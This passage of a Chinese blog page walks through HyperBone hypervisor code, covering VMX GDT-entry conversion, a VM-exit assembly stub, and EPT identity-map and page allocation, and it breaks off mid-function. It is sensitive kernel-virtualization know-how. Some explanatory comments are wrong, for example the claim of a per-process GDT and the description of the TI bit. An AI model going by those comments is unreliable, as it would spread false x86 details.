class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Fill segment data</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;GdtBase&quot;&gt;GDTR base&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Selector&quot;&gt;Segment selector value&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;VmxGdtEntry&quot;&gt;Resulting entry&lt;/param&gt;</span></span><br><span class="line"><span class="function">VOID <span class="title">VmxpConvertGdtEntry</span><span class="params">( IN PVOID GdtBase, IN USHORT Selector, OUT PVMX_GDTENTRY64 VmxGdtEntry )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    段选择子（segment selector）是用来唯一地标识一个内存段的16位或64位数字。</span></span><br><span class="line"><span class="comment">    在x86体系结构中，每个段选择子由两个部分组成：</span></span><br><span class="line"><span class="comment">    索引（index）和请求特权级别（requested privilege level，RPL）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    索引用于查找全局描述符表（GDT）或局部描述符表（LDT）中的段描述符，</span></span><br><span class="line"><span class="comment">    而RPL则指定了访问该段所需的最低权限级别（0到3）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    RPL可以通过对段选择子进行屏蔽（掩码）来获取。具体来说，将段选择子与0b11（即二进制的3）进行按位与运算，可以得到RPL的值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    例如，如果段选择子为0x08，那么其二进制表示为0000 1000，其中低两位（00）即为RPL的值。如果需要将RPL屏蔽掉，</span></span><br><span class="line"><span class="comment">    可以使用按位与运算符&amp;和~操作数取反运算符来进行屏蔽：0x08 &amp; ~0b11 = 0x08 &amp; 0xFC = 0x08。</span></span><br><span class="line"><span class="comment">    需要注意的是，在64位模式下，只有GDT被使用，因此只需要考虑索引部分，而RPL位会被忽略。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在x64 Windows操作系统内核中，每个进程都有自己的全局描述符表（GDT），</span></span><br><span class="line"><span class="comment">    用于保存其自身内存分段的信息。在对内存进行分段时，可以使用一个16位的段选择子来唯一地标识一个内存段。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    读取给定选择子（segment selector）的GDT条目，并屏蔽掉请求特权级别（requested privilege level，RPL）位。</span></span><br><span class="line"><span class="comment">    因为x64Windows在内核态下已经不使用局部描述符表（LDT），所以不需要考虑TI位（Table Indicator），它用于区分是引用GDT还是LDT。</span></span><br><span class="line"><span class="comment">    TI位（Table Indicator）是段选择子的一个位，用于指示该选择子所引用的描述符表是GDT还是LDT。TI位的取值为0或1，其中0表示引用GDT，1表示引用LDT。</span></span><br><span class="line"><span class="comment">    TI位则占据了选择子的第2位，因此选择子的最高有效位为TI位。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在x64模式下，每个选择子由两个部分组成：索引部分和RPL部分。索引部分用于查找GDT中的相应段描述符，</span></span><br><span class="line"><span class="comment">    而RPL则指定了访问该段的权限级别。RPL通常会和当前运行代码的特权级别进行比较，以确定访问是否被允许。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    在Windows内核中，0和3级特权级别都可以引用内核GDT中的所有段描述符，因此不需要进行RPL屏蔽。</span></span><br><span class="line"><span class="comment">    但是，在某些情况下，为了安全起见，可能会使用引用GDT的低特权级别来访问只有高特权级别才能访问的内存段。</span></span><br><span class="line"><span class="comment">    在这种情况下，需要进行RPL屏蔽来确保代码可以访问相应的内存段。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">// 屏蔽RPL位</span></span><br><span class="line">    PKGDTENTRY64 gdtEntry = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( (Selector &amp; SELECTOR_TABLE_INDEX) == <span class="number">0</span> );</span><br><span class="line">    gdtEntry = (PKGDTENTRY64)((ULONG_PTR)GdtBase + (Selector &amp; ~RPL_MASK));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将传入的段选择子赋值给VMX_GDTENTRY64结构体的Selector字段</span></span><br><span class="line">    VmxGdtEntry-&gt;Selector = Selector;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用LSL指令（Load Segment Limit）读取段限制（segment limit）。</span></span><br><span class="line">    VmxGdtEntry-&gt;Limit = __segmentlimit( Selector );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    在x86体系结构中，段描述符中的“System”位（也称为“S”位）用于区分系统段和代码/数据段。</span></span><br><span class="line"><span class="comment">    当“System”位被清除时（即为0），表示这是一个代码段或数据段，需要对相对虚拟地址（RVA）进行地址计算。</span></span><br><span class="line"><span class="comment">    将段基址与RVA相加，构建完整的64位有效地址。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    对于非系统段，需要进行以下步骤来构建完整的64位线性地址：</span></span><br><span class="line"><span class="comment">        将段基址与RVA相加，得到32位的线性地址。</span></span><br><span class="line"><span class="comment">        将线性地址的高32位与段选择子中的基地址合并，构建出64位的线性地址。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    需要注意的是，在Windows操作系统中，KGDTENTRY64结构中的“System”字段位置被定义错误了，</span></span><br><span class="line"><span class="comment">    实际上，“System”位应该编码在“Type”字段的最高位。这意味着在Windows内核中计算64位地址时需要特别小心，</span></span><br><span class="line"><span class="comment">    以确保不会使用错误的字段。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据GDT中的字段信息，构建完整的64位有效地址。需要注意的是，只有当Type字段中的System位为0时才进行构建。</span></span><br><span class="line"><span class="comment">    构建过程分为三部分：将BaseHigh字段左移24位，将BaseMiddle字段左移16位，将BaseLow字段保持不变，</span></span><br><span class="line"><span class="comment">    并使用逻辑或运算符组合它们。如果Type字段中的最高位为0，</span></span><br><span class="line"><span class="comment">    则还需要将BaseUpper字段左移32位并与之前的结果进行逻辑或运算。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    VmxGdtEntry-&gt;Base = ((gdtEntry-&gt;Bytes.BaseHigh &lt;&lt; <span class="number">24</span>) | (gdtEntry-&gt;Bytes.BaseMiddle &lt;&lt; <span class="number">16</span>) | (gdtEntry-&gt;BaseLow)) &amp; MAXULONG;</span><br><span class="line">    VmxGdtEntry-&gt;Base |= ((gdtEntry-&gt;Bits.Type &amp; <span class="number">0x10</span>) == <span class="number">0</span>) ? ((ULONG_PTR)gdtEntry-&gt;BaseUpper &lt;&lt; <span class="number">32</span>) : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载访问权限信息</span></span><br><span class="line">    VmxGdtEntry-&gt;AccessRights = <span class="number">0</span>;</span><br><span class="line">    VmxGdtEntry-&gt;Bytes.Flags1 = gdtEntry-&gt;Bytes.Flags1;</span><br><span class="line">    VmxGdtEntry-&gt;Bytes.Flags2 = gdtEntry-&gt;Bytes.Flags2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理VMX相关的位</span></span><br><span class="line">    VmxGdtEntry-&gt;Bits.Reserved = <span class="number">0</span>;</span><br><span class="line">    VmxGdtEntry-&gt;Bits.Unusable = !gdtEntry-&gt;Bits.Present;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="将当前状态存储在栈中，并跳转到一个-C-函数-VmxpExitHandler-中去处理-VM-的-exit-事件"><a href="#将当前状态存储在栈中，并跳转到一个-C-函数-VmxpExitHandler-中去处理-VM-的-exit-事件" class="headerlink" title="将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件"></a>将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">VmxVMEntry PROC</span><br><span class="line">    push    rcx                 ; save RCX, as we will need to orverride it</span><br><span class="line">    lea     rcx, [rsp+8h]       ; store the context in the stack, bias for</span><br><span class="line">                                ; the return address and the push we just did.</span><br><span class="line">    call    RtlCaptureContext   ; save the current register state.</span><br><span class="line">                                ; note that this is a specially written function</span><br><span class="line">                                ; which has the following key characteristics:</span><br><span class="line">                                ;   1) it does not taint the value of RCX</span><br><span class="line">                                ;   2) it does not spill any registers, nor</span><br><span class="line">                                ;      expect home space to be allocated for it</span><br><span class="line"></span><br><span class="line">    jmp     VmxpExitHandler     ; jump to the C code handler. we assume that it</span><br><span class="line">                                ; compiled with optimizations and does not use</span><br><span class="line">                                ; home space, which is true of release builds.</span><br><span class="line">VmxVMEntry ENDP</span><br></pre></td></tr></table></figure><h5 id="初始化EPT，创建Guest到Host的页映射（Page-Mappings）"><a href="#初始化EPT，创建Guest到Host的页映射（Page-Mappings）" class="headerlink" title="初始化EPT，创建Guest到Host的页映射（Page Mappings）"></a>初始化EPT，创建Guest到Host的页映射（Page Mappings）</h5><p><img src="/.io//20200404211829769.jpeg" alt="在这里插入图片描述"></p><p>为了解决GVA-GPA-HPA的转换关系，在没有硬件辅助的时代，Hypervisor通过影子页表，很巧妙的将GVA-GPA映射到GVA-HPA, 功能虽然达成，但是在很多实际场景下，如进程频繁切换，内存频繁分配释放等，性能损耗会非常大；</p><p>EPT在硬件的帮助下，实现内存虚拟化简单直接，传统页表继续负责GVA-GPA, 而EPT负责GPA-HPA; 虽然内存访问延时可能会增加一些，但是大幅减少了因为页表更新带来的vmexit, 综合性价比提升巨大, 所以现代内存虚拟化，基本都被EPT统一了。</p><p><img src="https://pic1.zhimg.com/80/v2-121b31dd73963473ebb0ea19ea59bef4_720w.webp" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Create Guest to Host page mappings</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptBuildIdentityMap</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_SUCCESS;<span class="comment">// 已经创建过</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    PML4（Page Map Level 4）是 x86 架构中分页机制的一级页表。</span></span><br><span class="line"><span class="comment">    在 x86 架构的分页机制中，物理内存被划分为固定大小的页面（通常为4KB）。</span></span><br><span class="line"><span class="comment">    为了管理这些页面，操作系统使用页表来建立虚拟地址与物理地址之间的映射关系。</span></span><br><span class="line"><span class="comment">    页表被组织为一个多级结构，其中 PML4 是最高级的页表。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PML4 是一个包含512个表项的数组，每个表项（PML4 Entry）的大小为8字节。</span></span><br><span class="line"><span class="comment">    每个表项对应着一个 PDP（Page Directory Pointer）表，PDP 表进一步将虚拟地址映射到下一级的页表，</span></span><br><span class="line"><span class="comment">    直到最后一级页表（称为页表 PDT）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    通过多级的页表结构，操作系统可以灵活地管理大量的内存页面，并实现虚拟地址到物理地址的映射。</span></span><br><span class="line"><span class="comment">    PML4 负责管理最高级的页表，它的物理地址必须在处理器的控制寄存器（CR3）中设置，</span></span><br><span class="line"><span class="comment">    以使处理器能够正确进行地址转换。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    pEPT-&gt;PML4Ptr = (PEPT_PML4_ENTRY)<span class="built_in">EptpAllocatePage</span>( pEPT );<span class="comment">// 分配一个页面作为PML4表表项</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;<span class="comment">// 错误则表示内存资源不足</span></span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">EptpFillTable</span>( pEPT, pEPT-&gt;PML4Ptr );<span class="comment">// 填充PML4表，创建其他级别的页表和映射关系</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        <span class="built_in">EptFreeIdentityMap</span>( pEPT );<span class="comment">// 创建失败则释放资源</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//DPRINT( &quot;HyperBone: CPU %d: %s: Used pages %d\n&quot;, CPU_IDX, __FUNCTION__, pEPT-&gt;TotalPages );</span></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="分配EPT页面"><a href="#分配EPT页面" class="headerlink" title="分配EPT页面"></a>分配EPT页面</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate page for PTE table</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PEPT_MMPTE <span class="title">EptpAllocatePage</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    IRQL（Interrupt Request Level）是Windows操作系统中用于表示中断请求的优先级的概念。</span></span><br><span class="line"><span class="comment">    它用于控制不同中断的处理顺序，以确保系统正常运行并防止冲突。</span></span><br><span class="line"><span class="comment">    在Windows内核中，存在多个不同的IRQL级别，从最低的PASSIVE_LEVEL到最高的HIGH_LEVEL。</span></span><br><span class="line"><span class="comment">    较低的IRQL级别表示较低的中断优先级，而较高的IRQL级别表示较高的中断优先级。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    例程（Routine）是指一段代码或函数，通常用于执行特定的任务或功能。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    检查当前IRQL是否大于DISPATCH_LEVEL，如果大于意味着在此级别以上的中断处理程序中，</span></span><br><span class="line"><span class="comment">    使用内存分配例程会发生错误，因此直接调用高IRQL情况下的页面分配函数。 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">KeGetCurrentIrql</span>() &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">EptpAllocatePageHighIRQL</span>( pEPT );</span><br><span class="line"></span><br><span class="line">    PHYSICAL_ADDRESS Highest = &#123; <span class="number">0</span> &#125;, Lowest = &#123; <span class="number">0</span> &#125;;<span class="comment">// 物理地址</span></span><br><span class="line">    Highest.QuadPart = ~<span class="number">0</span>;<span class="comment">// 全部置为1，设为最大物理地址</span></span><br><span class="line">    <span class="comment">// 分配连续的、指定缓存类型的内存页面，页面大小为PAGE_SIZE(4kb)</span></span><br><span class="line">    PEPT_MMPTE ptr = (PEPT_MMPTE)<span class="built_in">MmAllocateContiguousMemorySpecifyCache</span>( PAGE_SIZE, Lowest, Highest, Lowest, MmNonCached );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成功分配 Save page ptr in array</span></span><br><span class="line">    <span class="keyword">if</span> (ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        pEPT-&gt;TotalPages++;<span class="comment">// 增加已分配页面数量</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( ptr, PAGE_SIZE );</span><br><span class="line"></span><br><span class="line">        BOOLEAN allocEntry = FALSE;</span><br><span class="line">        PEPT_PAGES_ENTRY pEntry = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsListEmpty</span>( &amp;pEPT-&gt;PageList ))<span class="comment">// 检查EPT页链表是否为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            allocEntry = TRUE;<span class="comment">// 需要分配一个新的列表入口</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            pEntry = <span class="built_in">CONTAINING_RECORD</span>( pEPT-&gt;PageList.Flink, EPT_PAGES_ENTRY, link );</span><br><span class="line">            <span class="keyword">if</span> (pEntry-&gt;count &gt;= PAGES_PER_ENTRY)<span class="comment">// 检查当前列表入口是否已满</span></span><br><span class="line">                allocEntry = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (allocEntry)<span class="comment">// 需要分配一个新的列表入口</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从指定NonPagedPoolNx内存池中分配内存，大小为EPT_PAGES_ENTRY结构体大小</span></span><br><span class="line">            pEntry = <span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, <span class="built_in">sizeof</span>( EPT_PAGES_ENTRY ), HB_POOL_TAG );</span><br><span class="line">            <span class="keyword">if</span> (pEntry == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate EPT_PAGES_ENTRY struct\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">                <span class="keyword">return</span> ptr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>( pEntry, <span class="built_in">sizeof</span>( EPT_PAGES_ENTRY ) );</span><br><span class="line">            pEntry-&gt;pages[pEntry-&gt;count] = ptr;</span><br><span class="line">            pEntry-&gt;count++;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">InsertHeadList</span>( &amp;pEPT-&gt;PageList, &amp;pEntry-&gt;link );<span class="comment">// 将新的列表入口插到EPT页链表头部</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 不需要分配，直接记录</span></span><br><span class="line">            pEntry-&gt;pages[pEntry-&gt;count] = ptr;</span><br><span class="line">            pEntry-&gt;count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: Failed to allocate EPT page\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">        <span class="built_in">ASSERT</span>( FALSE );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="在更高级的IRQL申请页面"><a href="#在更高级的IRQL申请页面" class="headerlink" title="-在更高级的IRQL申请页面"></a>-在更高级的IRQL申请页面</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Allocate page at IRQL &gt; DISPATCH_LEVEL</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PEPT_MMPTE <span class="title">EptpAllocatePageHighIRQL</span><span class="params">( IN PEPT_DATA pEPT )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检查预分配页面数量是否小于预分配页面数量上限</span></span><br><span class="line">    <span class="keyword">if</span> (pEPT-&gt;Preallocations &lt; EPT_PREALLOC_PAGES)</span><br><span class="line">    &#123;</span><br><span class="line">        PEPT_MMPTE ptr = pEPT-&gt;Pages[pEPT-&gt;Preallocations];<span class="comment">// 将预分配页面数组中的下一个页面指针赋给ptr</span></span><br><span class="line">        pEPT-&gt;Preallocations++;</span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有页面可以分配，触发蓝屏</span></span><br><span class="line">    <span class="built_in">KeBugCheckEx</span>( HYPERVISOR_ERROR, BUG_CHECK_EPT_NO_PAGES, pEPT-&gt;Preallocations, EPT_PREALLOC_PAGES, <span class="number">0</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="根据已使用的物理区域填充-PML4-表"><a href="#根据已使用的物理区域填充-PML4-表" class="headerlink" title="根据已使用的物理区域填充 PML4 表"></a>根据已使用的物理区域填充 PML4 表</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Fill PML4 table accordingly to used physical regions</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;PML4Ptr&quot;&gt;EPT PML4 pointer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">EptpFillTable</span><span class="params">( IN PEPT_DATA pEPT, IN PEPT_PML4_ENTRY PML4Ptr )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( PML4Ptr != <span class="literal">NULL</span> );<span class="comment">// 断言PML4Ptr不为空</span></span><br><span class="line">    <span class="keyword">if</span> (PML4Ptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line">    <span class="comment">// 遍历已使用的物理内存区域填充PML4表</span></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; g_Data-&gt;Memory-&gt;NumberOfRuns; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 计算该物理区域可用于填充表的页数，取总页数和EPT表项数的最小值</span></span><br><span class="line">        ULONG64 first = g_Data-&gt;Memory-&gt;Run[i].BasePage;</span><br><span class="line">        ULONG64 total = g_Data-&gt;Memory-&gt;Run[i].PageCount;</span><br><span class="line">        ULONG64 count = <span class="built_in">min</span>( total, EPT_TABLE_ENTRIES - (first &amp; (EPT_TABLE_ENTRIES - <span class="number">1</span>)) );</span><br><span class="line">       <span class="comment">// 初始化物理页帧号为first</span></span><br><span class="line">        ULONG64 hostPFN = first;</span><br><span class="line">        <span class="keyword">for</span> (ULONG64 pfn = first; total &gt; <span class="number">0</span>;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 嵌套调用EptUpdateTableRecursive函数，填充PML4表</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>( <span class="built_in">EptUpdateTableRecursive</span>( pEPT, PML4Ptr, EPT_TOP_LEVEL, pfn, EPT_ACCESS_ALL, hostPFN, (ULONG)count ) ))</span><br><span class="line">                <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">            <span class="comment">// 更新pfn、hostPFN和total</span></span><br><span class="line">            pfn += count; </span><br><span class="line">            hostPFN += count;</span><br><span class="line">            total -= count;</span><br><span class="line">            count = <span class="built_in">min</span>( total, EPT_TABLE_ENTRIES - (pfn &amp; 